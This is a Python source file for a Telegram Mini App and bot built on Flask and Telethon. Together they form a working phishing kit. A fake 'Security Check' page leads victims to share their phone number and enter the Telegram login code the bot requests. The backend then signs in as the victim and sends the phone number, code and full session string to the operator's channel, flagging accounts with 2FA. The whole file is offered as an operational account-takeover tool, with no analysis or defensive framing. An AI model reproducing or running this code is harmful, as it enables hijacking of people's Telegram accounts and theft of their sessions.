import os
import asyncio
import json
import threading
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from flask import Flask, request, jsonify, render_template_string
import psycopg2

# Railway uses environment variables, not config.py
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))  # For sending captured sessions
DATABASE_URL = os.environ.get("DATABASE_URL")

print("=" * 50)
print("SCRIPT STARTING...")
print("=" * 50)

app = Flask(__name__)

# Bot client (for receiving contacts via Telegram messages)
bot_client = TelegramClient('bot_session', API_ID, API_HASH)

# Store for sessions: user_id -> {phone, phone_code_hash, session_string}
active_sessions = {}

def get_db():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT PRIMARY KEY,
                phone TEXT NOT NULL,
                phone_code_hash TEXT,
                session_string TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("Database initialized.")
    except Exception as e:
        print(f"DB Error: {e}")

async def send_to_channel(message):
    try:
        temp = TelegramClient('logger', API_ID, API_HASH)
        await temp.start(bot_token=BOT_TOKEN)
        await temp.send_message(CHANNEL_ID, message)
        await temp.disconnect()
    except Exception as e:
        print(f"Channel send error: {e}")

FRONTEND_HTML = """<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #16213e; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px; }
        .btn { background: #e94560; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; margin: 10px; width: 80%; }
        .code-input { width: 200px; padding: 15px; font-size: 24px; text-align: center; border-radius: 8px; border: none; margin: 10px; }
        #screen2, #screen3 { display: none; }
        .error { color: #ff6b6b; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card" id="screen1">
        <h2>Security Check</h2>
        <p>Click below to verify</p>
        <button class="btn" onclick="next1()">Continue</button>
    </div>
    
    <div class="card" id="screen2">
        <h2>Almost Done</h2>
        <p>Please message the bot your contact first, then enter the code here</p>
        <button class="btn" onclick="showCode()">Enter Code</button>
    </div>
    
    <div class="card" id="screen3">
        <h2>Enter Verification Code</h2>
        <p>Check your Telegram messages for the code</p>
        <input type="text" id="code" class="code-input" maxlength="5" placeholder="12345">
        <br>
        <button class="btn" onclick="submitCode()">Verify</button>
        <div class="error" id="error"></div>
    </div>

    <script>
        var tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        var userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        
        function next1() {
            document.getElementById('screen1').style.display = 'none';
            document.getElementById('screen2').style.display = 'block';
        }
        
        function showCode() {
            document.getElementById('screen2').style.display = 'none';
            document.getElementById('screen3').style.display = 'block';
        }
        
        function submitCode() {
            var code = document.getElementById('code').value;
            if (code.length !== 5) {
                document.getElementById('error').innerText = 'Enter 5-digit code';
                return;
            }
            
            fetch('/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, code: code})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('screen3').innerHTML = '<h2 style="color:#00ff88">Success!</h2>';
                    setTimeout(() => tg.close(), 2000);
                } else {
                    document.getElementById('error').innerText = data.error || 'Failed';
                }
            });
        }
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(FRONTEND_HTML)

@app.route('/verify', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    user_id = str(data.get('user_id'))
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session not found. Please message the bot your contact first."})
    
    session = active_sessions[user_id]
    phone = session['phone']
    phone_code_hash = session.get('phone_code_hash')
    session_string = session.get('session_string')
    
    if not phone_code_hash:
        return jsonify({"success": False, "error": "No code requested yet."})
    
    print(f"\n[VERIFY] Phone: {phone}, Code: {code}")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def try_login():
        # CRITICAL: Use the stored StringSession
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # SUCCESS - Get final session
            final_session = client.session.save()
            
            print(f"[CAPTURED] {phone}")
            print(f"[SESSION] {final_session[:50]}...")
            
            # Send to your channel
            msg = f"""🚨 CAPTURED

📞 {phone}
🔑 {code}
🔐 `{final_session}`

{datetime.now()}"""
            await send_to_channel(msg)
            
            await client.disconnect()
            
            # Cleanup
            del active_sessions[user_id]
            
            # Cleanup DB
            conn = get_db()
            cur = conn.cursor()
            cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
            conn.commit()
            cur.close()
            conn.close()
            
            return True, None
            
        except errors.PhoneCodeInvalidError:
            await client.disconnect()
            return False, "Invalid code"
        except errors.PhoneCodeExpiredError:
            await client.disconnect()
            return False, "Code expired, request new one"
        except errors.SessionPasswordNeededError:
            await client.disconnect()
            await send_to_channel(f"⚠️ 2FA on {phone}")
            del active_sessions[user_id]
            return False, "2FA enabled"
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    try:
        success, error = loop.run_until_complete(try_login())
        loop.close()
    except Exception as e:
        loop.close()
        return jsonify({"success": False, "error": str(e)})
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

async def bot_listener():
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Bot is online. Waiting for contacts...")

    @bot_client.on(events.NewMessage)
    async def handler(event):
        # Check if message has contact
        if event.message.media and hasattr(event.message.media, "phone_number"):
            phone = event.message.media.phone_number
            user_id = str(event.message.sender_id)
            
            print(f"[CONTACT] User {user_id}: {phone}")
            
            # Create client and request code
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            try:
                await client.connect()
                result = await client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                
                # Get session string BEFORE signing in
                session_string = client.session.save()
                
                # Store for later verification
                active_sessions[user_id] = {
                    'phone': phone,
                    'phone_code_hash': phone_code_hash,
                    'session_string': session_string
                }
                
                # Also store in DB
                conn = get_db()
                cur = conn.cursor()
                cur.execute("""
                    INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
                    VALUES (%s, %s, %s, %s)
                    ON CONFLICT (user_id) 
                    DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s
                """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
                conn.commit()
                cur.close()
                conn.close()
                
                print(f"[CODE SENT] to {phone}")
                
                # Send confirmation to user via bot
                await bot_client.send_message(user_id, "✅ Code requested! Check your Telegram app and enter it in the Mini App.")
                
                await client.disconnect()
                
            except Exception as e:
                print(f"[ERROR] {e}")
                await client.disconnect()
                await bot_client.send_message(user_id, f"❌ Error: {e}")

    await bot_client.run_until_disconnected()

if __name__ == '__main__':
    init_db()
    
    # Start bot in background
    thread = threading.Thread(target=lambda: asyncio.run(bot_listener()))
    thread.daemon = True
    thread.start()
    
    # Start Flask
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
